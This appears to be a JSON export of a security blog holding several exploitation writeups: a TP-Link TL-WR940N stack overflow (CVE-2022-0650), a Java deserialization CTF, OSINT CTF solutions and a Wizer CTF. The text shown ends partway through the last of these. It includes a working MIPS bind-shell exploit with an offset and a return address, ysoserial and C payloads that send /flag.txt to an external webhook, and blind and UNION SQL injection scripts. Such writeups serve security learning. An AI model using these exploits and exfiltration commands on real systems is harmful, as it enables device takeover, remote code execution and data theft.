[{"categories":["Exploitation"],"content":"Recently i was exploring Firmware analysis and iot exploitation domain out of curiosity , and it turned out to be very interesting to me. i spent a while studying Exploitation Basics , Solving Basic PWN \u0026 Reverse Engineering Challanges and Checking IOT Pentesting Course From FahemSec. I Spent days analyzing firmware and binaries in Ghidra and GDB and Finally I was able to reproduce couple of CVEs on TpLink Routers and even discover new ones! In This Post i am analyzing the CVE-2022-0650 which as described a “TP-Link TL-WR940N httpd newBridgessid Stack-based Buffer Overflow Remote Code Execution Vulnerability” This CVE has no public POC although it has been almost 3 years so i made one for it that executes a shell eventually. ","date":"2025-09-30","objectID":"/posts/exploitation/2025-10-01-cve-2022-0650-analysis/:0:0","tags":["CVE","Firmware-Analysis","Exploitation"],"title":"CVE-2022-0650 Analysis \u0026 POC","uri":"/posts/exploitation/2025-10-01-cve-2022-0650-analysis/"},{"categories":["Exploitation"],"content":"Setting Up Environment ","date":"2025-09-30","objectID":"/posts/exploitation/2025-10-01-cve-2022-0650-analysis/:1:0","tags":["CVE","Firmware-Analysis","Exploitation"],"title":"CVE-2022-0650 Analysis \u0026 POC","uri":"/posts/exploitation/2025-10-01-cve-2022-0650-analysis/"},{"categories":["Exploitation"],"content":"Getting Firmware We don’t need to buy this specifc router to analyze/reproduce bugs , Most of TpLink Firmwares are public on their website to download. we can download that version from here. after downloading it we got .bin file which is the firmware file. we can inspect the SquashFS system if we want by running binwalk -e fw.bin DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 15120 0x3B10 LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 95708 bytes 131584 0x20200 LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 2589532 bytes\rThis will extract recognized embedded files automatically into _fw.bin.extracted and we can find squashfs-root which contains the file system. This will not be very helpful for our blog post but we can read the root shadow file and get the password as we will use it latter cat etc/shadow root:$1$GTN.gpri$DlSyKvZKMR9A9Uj9e9wR3/:15502:0:99999:7:::\rSearching the password online will find it is sohoadmin ","date":"2025-09-30","objectID":"/posts/exploitation/2025-10-01-cve-2022-0650-analysis/:1:1","tags":["CVE","Firmware-Analysis","Exploitation"],"title":"CVE-2022-0650 Analysis \u0026 POC","uri":"/posts/exploitation/2025-10-01-cve-2022-0650-analysis/"},{"categories":["Exploitation"],"content":"Firmadyne Emulation As we have the firmware binary file we can try emulate it with firmadyne tool From Repo it uses Qemu to emulate that image. After setting it up and configure what needed as repo mentions , we can run the binary , 1 is the image id which will be 1 for your first image firmadyne/scratch/1/run.sh Creating TAP device tap1_0... Set 'tap1_0' persistent and owned by uid 1000 Bringing up TAP device... Adding route to 192.168.0.1... Starting firmware emulation... use Ctrl-a + x to exit [ 0.000000] Linux version 2.6.39.4+ (ddcc@ddcc-virtual) (gcc version 5.3.0 (GCC) ) #2 Tue Sep 1 18:08:53 EDT 2020 [ 0.000000] bootconsole [early0] enabled [ 0.000000] CPU revision is: 00019300 (MIPS 24Kc) [ 0.000000] FPU revision is: 00739300 [ 0.000000] Determined physical RAM map: [ 0.000000] memory: 00001000 @ 00000000 (reserved) [ 0.000000] memory: 000ef000 @ 00001000 (ROM data) [ 0.000000] memory: 00678000 @ 000f0000 (reserved) [ 0.000000] memory: 0f897000 @ 00768000 (usable) [ 0.000000] debug: ignoring loglevel setting. [ 0.000000] Wasting 60672 bytes for tracking 1896 unused pages [ 0.000000] Initrd not found or empty - disabling initrd ... and when it asks for password we will write the one we had before from shadow file. after getting shell we will enable iptables and start services with rcS iptables -F \u0026 iptables -P INPUT ACCEPT sh /etc/rc.d/rcS\rwe should be able to access router web portal now ┌──(mesbah㉿firmware)-[~/Desktop/firmadyne] └─$ curl 192.168.0.1 \u003cMETA http-equiv=Content-Type content=\"text/html; charset=iso-8859-1\"\u003e \u003cHTML\u003e \u003cHEAD\u003e\u003cTITLE\u003eTL-WR740N/TL-WR741ND\u003c/TITLE\u003e \u003cMETA http-equiv=Pragma content=no-cache\u003e \u003cMETA http-equiv=Expires content=\"wed, 26 Feb 1997 08:21:57 GMT\"\u003e \u003cSCRIPT language=\"javascript\" type=\"text/javascript\"\u003e\u003c!-- //--\u003e\u003c/SCRIPT\u003e \u003cSCRIPT language=\"javascript\" type=\"text/javascript\"\u003e var httpAutErrorArray = new Array( 3, 1, \"http://192.168.0.1\", 0,0 ); \u003c/SCRIPT\u003e \u003cSCRIPT language=\"javascript\" type=\"text/javascript\"\u003e if(window.parent != window) { document.cookie = \"Authorization=;path=/\"; window.parent.location.href = httpAutErrorArray[2]; } \u003c/SCRIPT\u003e \u003cscript type=\"text/javascript\" src=\"../login/encrypt.js\" /\u003e\u003c/script\u003e \u003cstyle type=\"text/css\"\u003e\r","date":"2025-09-30","objectID":"/posts/exploitation/2025-10-01-cve-2022-0650-analysis/:1:2","tags":["CVE","Firmware-Analysis","Exploitation"],"title":"CVE-2022-0650 Analysis \u0026 POC","uri":"/posts/exploitation/2025-10-01-cve-2022-0650-analysis/"},{"categories":["Exploitation"],"content":"Locating Httpd Binary The Firmware Binary file itself contains alot of data like filesystem , binaries ,services and more. we are analyzing those services/binaries , Logging into the webportal (default creds are admin:admin) will find the following URL Format : NTOYIHJBBFEPWVDA is changed each time we login as it is related to session http://192.168.0.1/NTOYIHJBBFEPWVDA/userRpm/Index.htm\rIf we searching in the squashFs files for what binaries might include that URI will find /usr/bin/httpd , that is not always the case you might find it in a directory contins web pages and you need to trace it back to find the binary. But for Tplink it is usually /usr/bin/httpd ──(mesbah㉿firmware)-[~/Desktop/_fw.bin.extracted/squashfs-root] └─$ grep -ria 'Index.htm' . /userRpm/BannerRpm.htm/userRpm/MainRpm.htm/userRpm/LogoutRpm.htmLogoutRpm/userRpm/MenuRpm.htmWzdStepOnlyBasic visibleMenuList\"WzdStartRpm\", ./usr/bin/httpd:window.parent.location.href = \"%s/%s/userRpm/Index.htm\"; */*/Index.htm/images/*/fs/images/*/frames/*/fs/frames/*/dynaform/*/fs/dynaform/*/userRpm/*/\rDrop the httpd Binary to Ghidra and start analysis. ","date":"2025-09-30","objectID":"/posts/exploitation/2025-10-01-cve-2022-0650-analysis/:1:3","tags":["CVE","Firmware-Analysis","Exploitation"],"title":"CVE-2022-0650 Analysis \u0026 POC","uri":"/posts/exploitation/2025-10-01-cve-2022-0650-analysis/"},{"categories":["Exploitation"],"content":"Analyzing the Binary The Advisory Contains “TP-Link TL-WR940N httpd newBridgessid Stack-based Buffer Overflow Remote Code Execution Vulnerability” We have a place to start from , searching for newBridgessid we will find the following string which has a reference in FUN_0045b218 Inspecting The Function we can understand the root cause of the Bug , although strncpy is more safe than strcpy as it has additional parameter that specifies the length to copy from source to destination. in this code snippet the length is not the destination length instead it is the source length , source here is our parameter input “newBridgessid” This means we can write on stack beyond the local variable specified length which can overwrite the RIP Eventually , side note in MIPs Architecture RIP is called PC :) In Ghidra Traceback the function callers we will find void httpWlanBasicCfgRpmsInit(void) { menuItemListAdd(\"WlanNetworkRpm\"); httpRpmConfAdd(2,\"/userRpm/WlanNetworkRpm.htm\",\u0026LAB_0045c6fc); httpRpmConfAdd(2,\"/userRpm/WlanNetworkRpm_AP.htm\",\u0026LAB_0045c6f0); httpRpmConfAdd(2,\"/userRpm/WlanNetworkRpm_APC.htm\",\u0026LAB_0045c6e4); unCheckRefererUrlAdd(\"/userRpm/popupSiteSurveyRpm.htm\"); unCheckRefererUrlAdd(\"/userRpm/popupSiteSurveyRpm_AP.htm\"); httpRpmConfAdd(2,\"/userRpm/popupSiteSurveyRpm.htm\",\u0026LAB_0045d644); httpRpmConfAdd(2,\"/userRpm/popupSiteSurveyRpm_AP.htm\",\u0026LAB_0045d638); return; }\rand we will find our function call here , so the page WlanNetworkRpm.htm is handled by that vulnerable function FUN_0045b218 void UndefinedFunction_0045c6fc(undefined4 param_1) { FUN_0045b218(0,param_1); return; }\rOne Thing Before Starting the Debgugging and POC Section , in the run.sh file for image emulation i added norandmaps in the Qemu Command to disable the ASLR. ","date":"2025-09-30","objectID":"/posts/exploitation/2025-10-01-cve-2022-0650-analysis/:2:0","tags":["CVE","Firmware-Analysis","Exploitation"],"title":"CVE-2022-0650 Analysis \u0026 POC","uri":"/posts/exploitation/2025-10-01-cve-2022-0650-analysis/"},{"categories":["Exploitation"],"content":"Debugging and Overwriting PC The page doesn’t seem to be accessed from the UI , but we can capture a valid request and add parameters as following ","date":"2025-09-30","objectID":"/posts/exploitation/2025-10-01-cve-2022-0650-analysis/:3:0","tags":["CVE","Firmware-Analysis","Exploitation"],"title":"CVE-2022-0650 Analysis \u0026 POC","uri":"/posts/exploitation/2025-10-01-cve-2022-0650-analysis/"},{"categories":["Exploitation"],"content":"Setting up GDB To be able to use GDB First we need to move gdb-server to the image first , we can do that easily by running scripts/mount.sh 1 and move it there and run scripts/umount.sh 1 to unmount it then run the image again. Get the httpd process (last one in processes) and run the gdb server ./gdbserver-7.12-mips-be-stripped --attach :1234 813 Attached; pid = 813 Listening on port 1234\rNow From Your machine connect to it and make a breakpoint on strncpy sudo gdb-multiarch \\ -ex \"set architecture mips\" \\ -ex \"set endian big\" \\ -ex \"set follow-fork-mode parent\" \\ -ex \"set detach-on-fork on\" \\ -ex \"set auto-solib-add off\" \\ -ex \"set solib-absolute-prefix /\" \\ -ex \"break strncpy\" \\ -ex \"target extended-remote 192.168.0.1:1234\"\r","date":"2025-09-30","objectID":"/posts/exploitation/2025-10-01-cve-2022-0650-analysis/:3:1","tags":["CVE","Firmware-Analysis","Exploitation"],"title":"CVE-2022-0650 Analysis \u0026 POC","uri":"/posts/exploitation/2025-10-01-cve-2022-0650-analysis/"},{"categories":["Exploitation"],"content":"Overwriting PC Now Sending a slightly large payload of “A” into that parameter in GDB we can find the PC has been overwritten successfully Now to get the offset will generate a pattern with cyclic and check its offset pwndbg\u003e cyclic -l 0x72616162 Finding cyclic pattern of 4 bytes: b'raab' (hex: 0x72616162) Found at offset 168\r","date":"2025-09-30","objectID":"/posts/exploitation/2025-10-01-cve-2022-0650-analysis/:3:2","tags":["CVE","Firmware-Analysis","Exploitation"],"title":"CVE-2022-0650 Analysis \u0026 POC","uri":"/posts/exploitation/2025-10-01-cve-2022-0650-analysis/"},{"categories":["Exploitation"],"content":"Stack Analysis Now Sending the payload \"A\"*168+\"BBBB\"+\"C\"*128+\"DDDD\" to confirm we control PC and check where rest of input is placed on stack. we can confirm that we can control PC , also rest of payload is placed on stack and SP is pointing to it ! Checking NX on The binary to check if stack is exectuable , and it is pwndbg\u003e checksec File: /tmp/tmpppjkpr27/tmp3fys92c7 Arch: mips RELRO: No RELRO Stack: No canary found NX: NX unknown - GNU_STACK missing PIE: No PIE (0x400000) Stack: Executable RWX: Has RWX segments\rOur Payload Now Should be \"A\"*offset+RIP+Nops+shellcode , RIP should be the SP value so when execution reaches that it will execute the stack. as we disabled ASLR we can use the SP address 0x7dbffba0 as our new RIP in our payload. ","date":"2025-09-30","objectID":"/posts/exploitation/2025-10-01-cve-2022-0650-analysis/:3:3","tags":["CVE","Firmware-Analysis","Exploitation"],"title":"CVE-2022-0650 Analysis \u0026 POC","uri":"/posts/exploitation/2025-10-01-cve-2022-0650-analysis/"},{"categories":["Exploitation"],"content":"POC For a Shell As we are going to use pwntools and make TCP Connection , we need to use construct the HTTP Request OurSelves. Example : def update_wifi_config(token): url = f\"http://192.168.0.1/{token}/userRpm/WlanNetworkRpm.htm\" params = { \"ssid1\": \"TP-LINK_B324_t\", \"ssid2\": \"TP-LINK_B324_2AAAAA\", \"ssid3\": \"TP-LINK_B324_3\",\"ssid4\": \"TP-LINK_B324_4\", \"region\": \"101\", \"band\": \"0\",\"mode\": \"5\" ,\"chanWidth\": \"2\",\"channel\": \"15\",\"ap\": \"1\",\"broadcast\": \"2\",\"brlssid\": \"\",\"brlbssid\": \"\",\"addrType\": \"1\",\"keytype\": \"1\",\"wepindex\": \"1\",\"authtype\": \"1\",\"keytext\": \"\",\"newBridgessid\": payload,\"Save\": \"Save\" } query_string = urlencode(params) path = f\"/{token}/userRpm/WlanNetworkRpm.htm?{query_string}\" headers = { \"Host\": host, \"Cookie\": \"Authorization=Basic%20YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3D\", \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0\", \"Referer\": f\"http://{host}/{token}/userRpm/MenuRpm.htm\", \"Connection\": \"close\" } request_lines = [f\"GET {path} HTTP/1.1\"] print(path) for k, v in headers.items(): request_lines.append(f\"{k}: {v}\") raw_request = \"\\r\\n\".join(request_lines) + \"\\r\\n\\r\\n\" io.send(raw_request.encode()) print(io.recvuntil(b\"\u003c/html\u003e\", timeout=2)) io.close()\rNow to generate the shellcode , we will use the shellcraft from the pwntools and choose bind shell type , we also need to not use the badchars while generation such as null byte and new lines. So the payload is overflowing until PC , Using RSP address and some NOPs and Finally the shellcode. context(arch='mips', endian='big', os='linux') host = \"192.168.0.1\" io = remote(host, 80) nop = asm(\"addiu $a0, $a0, 0x4141\") ra_addr = 0x7dbffba0 avoid = b'\\x00\\x0a\\x0d' + string.ascii_lowercase.encode() shell = asm(shellcraft.bindsh(1337)) assert all(c not in avoid for c in read_shell) payload = b\"A\" * 168 payload += p32(ra_addr) payload += nop * 10 payload += shell\rRunning the exploit , we successfuly got a shell Check Full POC Online here ","date":"2025-09-30","objectID":"/posts/exploitation/2025-10-01-cve-2022-0650-analysis/:4:0","tags":["CVE","Firmware-Analysis","Exploitation"],"title":"CVE-2022-0650 Analysis \u0026 POC","uri":"/posts/exploitation/2025-10-01-cve-2022-0650-analysis/"},{"categories":["Code Review"],"content":"JDBCLeak Leak was a challenge introducted in EGCERT CTF Finals 2025 under the category R\u0026D , tbh i didn’t even look at the challenge during CTF Time , didn’t expect this category to introduce such good example of a real case code review challenge , however after reading the author’s blog here about the category and challenge i thought of trying it myself and create a POC for it to get rce reading /flag.txt , we got 3rd place btw :“D ","date":"2025-05-28","objectID":"/posts/code-review/2025-05-29-jdbcleak-egcert-finals/:0:0","tags":["CTF","Java-Deserialization","RCE"],"title":"EGCERT-CTF JDBCLeak Exploit","uri":"/posts/code-review/2025-05-29-jdbcleak-egcert-finals/"},{"categories":["Code Review"],"content":"Basic Code analysis as already explained by the author we start with the web.xml file as it contains the routes and mappes servlets (which is the codebase mapped to the route) which contains the following /vjdbc endpoint has servlet VJdbcServlet VJdbcServlet servlet is mapped to class de.simplicit.vjdbc.server.servlet.ServletCommandSink which should be our start point. \u003c?xml version=\"1.0\" encoding=\"ISO-8859-1\"?\u003e \u003c!DOCTYPE web-app PUBLIC \"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN\" \"http://java.sun.com/dtd/web-app_2_3.dtd\"\u003e \u003cweb-app\u003e \u003cdisplay-name\u003eVJdbcServlet\u003c/display-name\u003e \u003cdescription\u003eServlet for using VJdbc over HTTP\u003c/description\u003e \u003cservlet\u003e \u003cservlet-name\u003eVJdbcServlet\u003c/servlet-name\u003e \u003cservlet-class\u003ede.simplicit.vjdbc.server.servlet.ServletCommandSink\u003c/servlet-class\u003e \u003cinit-param\u003e \u003cparam-name\u003econfig-resource\u003c/param-name\u003e \u003cparam-value\u003e/WEB-INF/config/vjdbc-config.xml\u003c/param-value\u003e \u003c/init-param\u003e \u003c/servlet\u003e \u003cservlet-mapping\u003e \u003cservlet-name\u003eVJdbcServlet\u003c/servlet-name\u003e \u003curl-pattern\u003e/vjdbc\u003c/url-pattern\u003e \u003c/servlet-mapping\u003e \u003c/web-app\u003e\rThe code base is not really that big and can easily identify the readObject function used multiple times private void handleRequest(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse) throws ServletException { ObjectInputStream ois = null; ObjectOutputStream oos = null; try { // Get the method to execute String method = httpServletRequest.getHeader(ServletCommandSinkIdentifier.METHOD_IDENTIFIER); if(method != null) { ois = new ObjectInputStream(httpServletRequest.getInputStream()); // And initialize the output OutputStream os = httpServletResponse.getOutputStream(); oos = new ObjectOutputStream(os); Object objectToReturn = null; try { // Some command to process ? if(method.equals(ServletCommandSinkIdentifier.PROCESS_COMMAND)) { // Read parameter objects Long connuid = (Long) ois.readObject(); // BUG Long uid = (Long) ois.readObject(); // BUG Command cmd = (Command) ois.readObject(); // BUG CallingContext ctx = (CallingContext) ois.readObject(); // BUG // Delegate execution to the CommandProcessor objectToReturn = _processor.process(connuid, uid, cmd, ctx); } else if(method.equals(ServletCommandSinkIdentifier.CONNECT_COMMAND)) { String url = ois.readUTF(); Properties props = (Properties) ois.readObject(); // BUG Properties clientInfo = (Properties) ois.readObject(); // BUG CallingContext ctx = (CallingContext) ois.readObject(); // BUG\rAs shown we have to pass the check if(method.equals(ServletCommandSinkIdentifier.PROCESS_COMMAND)) to send our serialized object raw format to be deserilaized. the method variable value is from METHOD_IDENTIFIER , searching for it will find it is : // java\\de\\simplicit\\vjdbc\\servlet\\ServletCommandSinkIdentifier.java public interface ServletCommandSinkIdentifier { public static final String METHOD_IDENTIFIER = \"vjdbc-method\"; public static final String CONNECT_COMMAND = \"connect\"; public static final String PROCESS_COMMAND = \"process\"; }\rand the PROCESS_COMMAND is simply process so we have to send the following headers to /vjdbc Content-Type: binary/x-java-serialized\rvjdbc-method: process\rsending GET or POST will both call the target function handleRequest protected void doGet(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse) throws ServletException { handleRequest(httpServletRequest, httpServletResponse); } protected void doPost(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse) throws ServletException { handleRequest(httpServletRequest, httpServletResponse); }\r","date":"2025-05-28","objectID":"/posts/code-review/2025-05-29-jdbcleak-egcert-finals/:1:0","tags":["CTF","Java-Deserialization","RCE"],"title":"EGCERT-CTF JDBCLeak Exploit","uri":"/posts/code-review/2025-05-29-jdbcleak-egcert-finals/"},{"categories":["Code Review"],"content":"Exploiting Virtual JDBC I have made a simple script to send the raw payload and will use it in sending any payload import requests import sys def send_bin_payload(url, bin_file_path): headers = { 'Content-Type': 'binary/x-java-serialized', 'vjdbc-method': 'process' } try: with open(bin_file_path, 'rb') as f: payload = f.read() response = requests.post(url, headers=headers, data=payload) print(f\"Status Code: {response.status_code}\") print(f\"Response Headers: {response.headers}\") try: print(f\"Response Content: {response.content}\") except: print(\"Could not decode response content\") return response except Exception as e: print(f\"Error: {str(e)}\") return None if __name__ == \"__main__\": if len(sys.argv) \u003c 3: print(\"Usage: python script.py \u003ctarget_url\u003e \u003cbin_file_path\u003e [method]\") print(\"Example: python script.py http://target/vjdbc payload.bin process\") sys.exit(1) target_url = sys.argv[1] bin_file = sys.argv[2] send_bin_payload(target_url, bin_file) print(\"done !\")\rNow testing the vulnerability , the app imports alot of apache libraries which seems good time to try ysoserial common collections gadgets payloads import org.apache.commons.*\rTrying Generate multiple payloads using common collections 1,2,..7 until this one workd this java options just for openjdk version 17 you may not need them java \\ --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED\\ --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED\\ --add-opens=java.base/sun.reflect.annotation=ALL-UNNAMED\\ -jar ~/tools/ysoserial.jar CommonsCollections7 \"curl https://webhook.site/0ea96080-c341-4e98-ab42-9557ecfd95e7\" \u003e shell.bin\rthen run the script will get a call back , now to get the flag.txt content tried multiple payloads but there was some issues so i generated a binary and executed it eventually ","date":"2025-05-28","objectID":"/posts/code-review/2025-05-29-jdbcleak-egcert-finals/:2:0","tags":["CTF","Java-Deserialization","RCE"],"title":"EGCERT-CTF JDBCLeak Exploit","uri":"/posts/code-review/2025-05-29-jdbcleak-egcert-finals/"},{"categories":["Code Review"],"content":"Generate a payload #include \u003cstdlib.h\u003e int main() { system(\"curl -X POST -F 'file=@/flag.txt' https://webhook.site/0ea96080-c341-4e98-ab42-9557ecfd95e7\"); return 0; } // compile with gcc test.c -o test\rNow will generate 3 java serilaized objects and run the python script for each to get the final flag wget http://server/test chmod +x ./test ./test\r","date":"2025-05-28","objectID":"/posts/code-review/2025-05-29-jdbcleak-egcert-finals/:2:1","tags":["CTF","Java-Deserialization","RCE"],"title":"EGCERT-CTF JDBCLeak Exploit","uri":"/posts/code-review/2025-05-29-jdbcleak-egcert-finals/"},{"categories":["OSINT"],"content":"CyCTF is organized by Cyshield’s cysec team every year , demonstrating new ideas and techniques in different categories (web exploitation , cryptography ,reverse and malware analysis , pwn , osint , mobile). it was my pleasure to be the author of SMS and vengeance challenges in web exploitation category and for the osint category in qualifcation and finals. this blog post will be about the solutions for the osint category in the finals round. My approach for creating the challenges was to not make it sherlock/yandex style ones and to introduce new ideas/techniques that can be used in real life scenarios. ","date":"2024-11-30","objectID":"/posts/osint/2024-11-30-cyctf-finals-osint-writeups/:0:0","tags":["CTF","OSINT"],"title":"CyCTF 2024 Finals OSINT Writeups","uri":"/posts/osint/2024-11-30-cyctf-finals-osint-writeups/"},{"categories":["OSINT"],"content":"New Friend challenge New Friend about osint process , video analysis , GEOINT , SOCMINT description we have been tracking a female suspect recently and we were able to hack into her mobile phone , however she seems to be very cautious and most likely she already know her phone is not safe anymore , while trying to locate her place it was located in Egypt however we are sure 100% this is not true. we were able to record a short video from her phone before she powered it off eventually and we were not able to identify the location, she has been visiting this places a lot recently, can you help us? an extra information that might be helpful she has been a friend to a multi faceted hairstylist. our goal from this simple task is to reach the hairstylist so we can contact her and get more details about our suspect. the flag is her email address , example flag CyCTF{fake_staylistmail@gmail.com} attached challenge.mp4 solves 4 Our starting point will be the video given , best approach is to : extract all frames from the video to deal with it as images extract audio from the video (to identify language used) Using online tools like ezgif we can extract all frames , the idea of this point is to extract important frames that can help us identify the location. there are 2 important main frames : First frame , we can identify the following artifacts : snow everywhere (we are in winter most likely , this is not the same status always) a river (so we are standing on a bridge) stairs in left and right of the river blue lights Tress on left and right Second Frame : Contains 2 big buildings one with blue colors the other one has the word “Terrassen” in it Doing basic GEOINT on the 2 frames and using google lens on the river frame , will find most images point to sweden , and this frame has same stairs in our frame we can take the image in results and drop it into geospy tool which quickly identifies the location it is not the most accurate location as from video we are standing on a bridge by a river which matches this location dropping street view we are in same location in video but different weather. Now our goal is to search for the hair stylist/dresser mentioned , form maps there is a hair studio very close to the bridge which we can investigate visiting the place website and in about us page will find team members listed the description mentioned a “Multi-faceted” hairstylist which matches this one called “bero” the page doesn’t contain a mail for each person in the team , however a quick search will find the instagram page for the salon and they follow the team members on social media will find bero’s account which contains a link on her bio and finally will find her mail address. ","date":"2024-11-30","objectID":"/posts/osint/2024-11-30-cyctf-finals-osint-writeups/:1:0","tags":["CTF","OSINT"],"title":"CyCTF 2024 Finals OSINT Writeups","uri":"/posts/osint/2024-11-30-cyctf-finals-osint-writeups/"},{"categories":["OSINT"],"content":"Maybe in another UniVerse challenge Maybe in another UniVerse about osint process , GEOINT , Metaverse description The Authorities have been tracking a hacker goes with the name “PWner” , he has been travelling from a country to another to erase his steps , he was very cautions recently , he has deleted most of his social media accounts like facebook , instagram and others based on our observations ,so any user with same name you might found most probably a fake one. But recently we were able to find his wife location and she told us the last thing he sent her was this letter , We are sure that she is hiding something although we believe this is the last message from him ,But we can’t solve this puzzle , can you help us ? attached challenge.png solves 1 The idea of challenge is to introduce new area of search which is metaverse assets ,the challenge image gives a big hint with the “another Universe” keyword,also mentioned 2 meta products facebook and instagram , which points to maybe the meta verse ? Searching for that will find a blog from osint Curios which discusses users can create a space and other users can join it so they can talk together and interact with VR in this space. The url format is https://www.spatial.io/@jake we can try add our target instead of jake to be https://www.spatial.io/@PWner and we have a match , checking his spaces will find one called 1337 Room , accessing it we can find a cyshield room Walking through the space will find the flag in an image on the wall ","date":"2024-11-30","objectID":"/posts/osint/2024-11-30-cyctf-finals-osint-writeups/:2:0","tags":["CTF","OSINT"],"title":"CyCTF 2024 Finals OSINT Writeups","uri":"/posts/osint/2024-11-30-cyctf-finals-osint-writeups/"},{"categories":["OSINT"],"content":"Complicated challenge Complicated about osint process , advanced GEOINT , SOCMINT description Hello Old Friend , One of my friends challenged me to solve a case but you have never disappointed me and i don’t think you will this time , all we know is that during tracking our target , he have recently attended a football match in France and after that he walked to KFC to have a nice meal, the catch is he made a mistake sharing something that reveals his identity while doing these activities. you may think that you have weak clues to find the target however actually it is not. The flag is the person’s name , example “Mohamed Samy” will be CyCTF{Mohamed_Samy} Hint1 did you know about french territories Hint2 can you “over pass” ? attached none solves 0 The challenge description contains several information : the search area is France targets went to a stadium to watch a football game the stadium is still active as he was there “recently” he walked to KFC after game meaning the branch is close to the stadium So our initial approach is to search for KFCs near stadiums in France , searching this manually will be very time consuming so we can take a smarter approach which is overpass queries , the area is France the target is KFC near stadiums (we can start with 500m) as a start [out:json][timeout:25]; area[\"name\"=\"France\"]-\u003e.searchArea; ( node[\"leisure\"=\"stadium\"](area.searchArea); way[\"leisure\"=\"stadium\"](area.searchArea); relation[\"leisure\"=\"stadium\"](area.searchArea); )-\u003e.stadiums; ( node[\"amenity\"=\"fast_food\"][\"name\"=\"KFC\"](around.stadiums:500); way[\"amenity\"=\"fast_food\"][\"name\"=\"KFC\"](around.stadiums:500); relation[\"amenity\"=\"fast_food\"][\"name\"=\"KFC\"](around.stadiums:500); ); out body; \u003e; out skel qt;\rThis narrows down possibilities a lot as we can see below The odd thing we can see in the image is this one , we search “France” and this showed up in results Searching about that we found the information that france has what is called “Overseas” contains several islands so basically this is french Zooming in will find the stadium and the KFC Branch Searching for it in google maps Found stadium name is “Stade Roger Zami” , after finding the place the description said he shared something that might reveal his identity , where can we find places and people rather than social media ? Checking The most famous apps for the location we have found : Flicker Instagram Snapmap Finally we found our target and we can confirm it is him by checking comment and description Hope to see you next year ! ","date":"2024-11-30","objectID":"/posts/osint/2024-11-30-cyctf-finals-osint-writeups/:3:0","tags":["CTF","OSINT"],"title":"CyCTF 2024 Finals OSINT Writeups","uri":"/posts/osint/2024-11-30-cyctf-finals-osint-writeups/"},{"categories":["Code Review"],"content":"Wizer CTF is an exciting game designed specifically for developers . It’s all about putting your skills to the test and seeing if you can identify and exploit vulnerabilities while honing your secure coding abilities. The game kicks off with a snappy code snippet that comes with some tricky vulnerabilities. Your goal? Spot those vulnerabilities and figure out how to exploit them. The cool thing is that you don’t have to rely on guesswork to know if you’ve got it right. You can actually execute your payload right there on the game page. If you manage to successfully exploit the vulnerabilities, you’ll earn yourself a flag and a well-deserved spot on leaderboard , The main focus area is web exploitation and the ctf event is held every quarter , this writeup discusses 5 challenges out of 6. ","date":"2024-05-05","objectID":"/posts/code-review/2024-05-06-wizerctf-may-2024/:0:0","tags":["CTF","SQLi","XSS","React","nodejs"],"title":"WizerCTF-May2024","uri":"/posts/code-review/2024-05-06-wizerctf-may-2024/"},{"categories":["Code Review"],"content":"1- Login as an Admin (SQLi) The first challenge is a typicall sql injection challenge however it checks if the password we enter is the same returning from the table which makes it a bit tricky , also the name of admin was given “fitzh” const getUser = async (userName, password) =\u003e { let connection = mysql.createConnection(process.env.DATABASE_URL); const query = `SELECT userName, password, type, firstName, lastName FROM users_table WHERE userName = '${userName}' and password = '${password}'`; const [rows, fields] = await connection.promise().query(query); connection.end(); return rows; } const login = async (userName, password) =\u003e { const rows = await getUser(userName, password); if(rows.length === 1 \u0026\u0026 password === rows[0].password) { rows[0].password = \"[REDACTED]\"; return rows; } return []; };\rthis challenge can be solved blind time based as following (time consuming , not smart , not intended) #!/usr/bin/env python3 import requests url = \"https://event2-0-4893hjf.vercel.app/api/login\" keyspace = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz!@#$^\u0026*' flag=\"\" data={'user':'','password':'test'} for i in range(16): for x in range (31,126) : data['user']= f\"fitzh' AND IF({x}=ascii(SUBSTR((SELECT password FROM users_table where userName='fitzh'),{i+1},1)),SLEEP(5),0);-- -\" response = requests.post(url,json=data) if(response.elapsed.total_seconds()\u003e3): flag += chr(x) print(flag) break print(flag)\rOr it can be easily solved using the AS Alias as some people did during the CTF { \"user\": \"fritzh' UNION SELECT 'fritzh' as userName, '\\\" AND \\\\'1\\\\' = \\\\'1' as password, (SELECT password from users_table where username='fitzh') as type, '' as firstName, '' as lastName WHERE '1' = '1' OR '1' = \\\" FROM users_table\", \"password\": \"\\\" AND '1' = '1\" }\r","date":"2024-05-05","objectID":"/posts/code-review/2024-05-06-wizerctf-may-2024/:1:0","tags":["CTF","SQLi","XSS","React","nodejs"],"title":"WizerCTF-May2024","uri":"/posts/code-review/2024-05-06-wizerctf-may-2024/"},{"categories":["Code Review"],"content":"2- Augustus Gloop’s Secret (APIs) The challenge discusses a recent bypass technique that when an api is blacklisted like “/admin” , it can be called with “/admin/” and the check will be bypassed easily , but this time they blacklisted the / character , so we can find other way to add a character make it valid to request /getuser but also bypasses the check of requireAuthentication There is a user id :4dc6b6fa-963f-4c51-b100-d2c5def2498d given to retrieve its data as a POC. dotenv.config(); const uuidFormat = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-5][0-9a-f]{3}-[089ab][0-9a-f]{3}-[0-9a-f]{12}$/i; const requireAuthentication = ['getuser', 'getcompany']; app.post('/callApi', async (req, res) =\u003e { let json = req.body; let api = String(json.api)?.trim()?.toLowerCase().replaceAll('/', '').replaceAll('\\\\', ''); let token = json.token; try { if (requireAuthentication.includes(api)) { if (token == process.env.tokenSecret) { console.log(\"authenticated api:\", api); const response = await axios.post(`http://localhost:${process.env.internalPort}/${api}`, json); res.send(response.data); } else { res.send(\"Invalid token\"); } } else { console.log(\"unauthenticated api:\", api); const response = await axios.post(`http://localhost:${process.env.internalPort}/${api}`, json); res.send(response.data); } } catch(e) { res.status(500).end(e.message); console.error(e); } }); app2.post('/getUser', async 